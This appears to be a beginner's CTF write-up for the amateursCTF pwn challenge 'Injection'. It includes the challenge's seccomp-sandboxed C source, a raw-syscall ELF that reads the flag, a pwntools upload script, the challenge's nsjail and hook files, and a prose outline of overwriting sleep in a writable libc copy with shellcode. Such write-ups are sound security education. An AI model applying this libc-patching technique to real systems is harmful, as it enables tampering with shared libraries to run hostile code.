
# [原创] amateursCTF [pwn/Injection]

Someone would say why? Its the shellcode again. Because I am beginnerrr for pwn just for a month and a half. And in fact, it should also be the weekend of the same week, I played RCTF. Then I got stuck by the SIGIN shellcode. Of course, the knowledge I learned was not solid enough. Dramatic events is that in my interview, I can make two heaps, but I can't get a flag from the stack. I mean, that time shellcode came too.

So, let u and m begin!

The Injection is belong to HARD at that CTF with only 3 men sols it. I will do a check. Gooddd luckkk to m.

```c
#define _GNU_SOURCE

#include <fcntl.h>

#include <seccomp.h>

#include <stdbool.h>

#include <stdint.h>

#include <stdio.h>

#include <stdlib.h>

#include <sys/mman.h>

#include <unistd.h>



#define FLAG_BYTES (0x100)



void install_seccomp() {

  scmp_filter_ctx ctx;

  ctx = seccomp_init(SCMP_ACT_KILL);

  int ret = 0;

  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);

  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);

  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);

  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);

  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);

  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

  ret |= seccomp_load(ctx);

  if (ret) {

    printf("seccomp failed");

    exit(1);

  }

}



int main() {

  char flag[FLAG_BYTES];

  int fd;

  size_t nbytes;



  setbuf(stdout, NULL);



  fd = open("/tmp/flag", O_RDONLY);

  if (fd < 0) {

    printf("failed to open flag.\n");

    printf("contact an admin\n");

    return 1;

  }



  flag[read(fd, flag, FLAG_BYTES - 1)] = 0;

  close(fd);



  fd = open("/tmp/flag", O_WRONLY | O_TRUNC);

  dprintf(fd, "amateursCTF{fake_flag}");

  close(fd);



  printf("elf bytes: ");

  if (scanf("%ld", &nbytes) != 1)

    return 1;

  getchar();



  uint8_t *elf = malloc(nbytes);

  if (elf == NULL)

    return 1;



  printf("reading %ld bytes\n", nbytes);

  fread(elf, sizeof(uint8_t), nbytes, stdin);

  fd = open("/tmp/solve", O_WRONLY | O_CREAT, 0777);

  printf("fd = %d\n", fd);

  printf("written = %ld\n", write(fd, elf, nbytes));

  printf("done writing elf\n");

  close(fd);



  if (fork() == 0) {

    install_seccomp();

    execve("/tmp/solve", NULL, NULL);

    perror("execve");

    exit(1);

  } else {

    while (true) {

      sleep(1);

    }

  }

}
```

Its very typical in foreign CTF competitions because they provide the source code.

Accepts an uploaded ELF binary from the player, saves it to `/tmp/solve`, and runs it inside a strict seccomp sandbox that only allows a few system calls.

To run this binary I should first run the command `elfpatch`.

## Stage 1: Just Create a Simple File

```c
#include <unistd.h>

#include <sys/syscall.h>

#include <fcntl.h>



int _start() {

    char buf[256];

    int fd;

    long n;



    // open("/tmp/flag", O_RDONLY)

    fd = syscall(SYS_open, "/tmp/flag", O_RDONLY);



    // read(fd, buf, 255)

    n = syscall(SYS_read, fd, buf, 255);



    // write(1, buf, n)

    syscall(SYS_write, 1, buf, n);



    // exit(0)

    syscall(SYS_exit, 0);

    return 0;

}
```

And we will use this command `gcc -static -nostdlib -fno-builtin -o solve 1.c`.

As we can see:

```text
/usr/bin/ld: /tmp/ccskv7ph.o: in function `_start':

1.c:(.text+0x29): undefined reference to `syscall'

/usr/bin/ld: 1.c:(.text+0x4c): undefined reference to `syscall'

/usr/bin/ld: 1.c:(.text+0x75): undefined reference to `syscall'

/usr/bin/ld: 1.c:(.text+0x89): undefined reference to `syscall'
```

The error occurs because you used `-nostdlib`; the linker does not automatically link libc, so the `syscall()` function is not provided, resulting in an undefined reference.

And then we have to think about how to escape it. What can I sayyyy? Yup.

```c
#include <fcntl.h>

#include <unistd.h>



static long my_syscall(long n, long a1, long a2, long a3) {

    long ret;

    __asm__(

        "syscall"

        : "=a"(ret)

        : "a"(n), "D"(a1), "S"(a2), "d"(a3)

        : "rcx", "r11", "memory"

    );

    return ret;

}



int _start() {

    char buf[256];

    long fd, n;



    fd = my_syscall(2, (long)"/tmp/flag", O_RDONLY, 0); 

    n  = my_syscall(0, fd, (long)buf, 255);             

    my_syscall(1, 1, (long)buf, n);                     

    my_syscall(60, 0, 0, 0);                           

    return 0;

}
```

Make system calls directly with inline assembly without calling `syscall()`.

```bash
gcc -static -nostdlib -fno-builtin -o solve 1.c
```

We can see it, and then we will get it:

```python
from pwn import *



io = process('./chal') 

data = open('solve', 'rb').read()

size = len(data)

print(f"[+] ELF size = {size}")

io.recvuntil(b"elf bytes: ")

io.sendline(str(size).encode())  

io.recvuntil(b"bytes\n")

io.send(data)                     

io.interactive()
```

And we use remote!!!

![](https://bbs.kanxue.com/upload/attach/202511/971598_HKVQJCAVF7FVDWA.webp)

However, it can find the true flag. I used to think there's a fake flag in the remote environment. It is a joke arl?

Let us think it moreeeeeeeeee :(((

Yuppp, it was me who didn't read the code...

## Stage 2: Use libc to Create

Wowww, why he let you to have execute it is because it needdddd.

Before that, we should think something: why he give us so many files?

`nsjail.cfg` and `hook.sh`:

```text
mode:LISTEN

hostname:"app"

cwd:"/app"

port:5000

max_conns:0

max_conns_per_ip:0

time_limit:0

rlimit_as_type:HARD

rlimit_cpu_type:HARD

rlimit_fsize_type:HARD

rlimit_nofile_type:HARD

mount:{

    src:"/srv"

    dst:"/"

    is_bind:true

    nosuid:true

    nodev:true

}

# mount:{

#     dst:"/proc"

#     fstype:"proc"

#     nosuid:true

#     nodev:true

#     noexec:true

# }

mount {

	dst: "/tmp"

	fstype: "tmpfs"

	rw: true

	is_bind: false

}

mount:{

    src_content:"FLAG_PLACEHOLDER"

    dst:"/tmp/flag"

    rw:true

}

cgroup_mem_max:209715200

cgroup_mem_swap_max:0

cgroup_pids_max:20

cgroup_cpu_ms_per_sec:100

cgroupv2_mount:"/jail/cgroup/unified/run"

use_cgroupv2:true

exec_bin:{

    path:"/app/run"

}
```

And:

```sh
#!/bin/sh



FLAG=$(cat /flag)

cp /nsjail.cfg /tmp/nsjail.cfg

sed -i "s/FLAG_PLACEHOLDER/$FLAG/" /tmp/nsjail.cfg
```

And:

```sh
#!/bin/sh



cp /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /tmp

cp /lib/x86_64-linux-gnu/libc.so.6 /tmp

cd /tmp

/app/chal
```

We know that here has the libc, and in our program we can see the `sleep`, so we maybe need to hook it.

Opens `/tmp/libc.so.6` in read–write mode and overwrites the bytes at the fixed offset `SLEEP_OFFSET` with custom shellcode. The code advances the file offset by repeatedly calling `read()`. Each `read()` call automatically moves the file pointer forward. It keeps reading in chunks (1024 bytes each time) until the current offset reaches `SLEEP_OFFSET`. Once the offset equals `SLEEP_OFFSET`, the code performs a `write()` to overwrite the data at that position with the shellcode buffer. Finally, it exits. And we also need `volatile` to write in the inline.
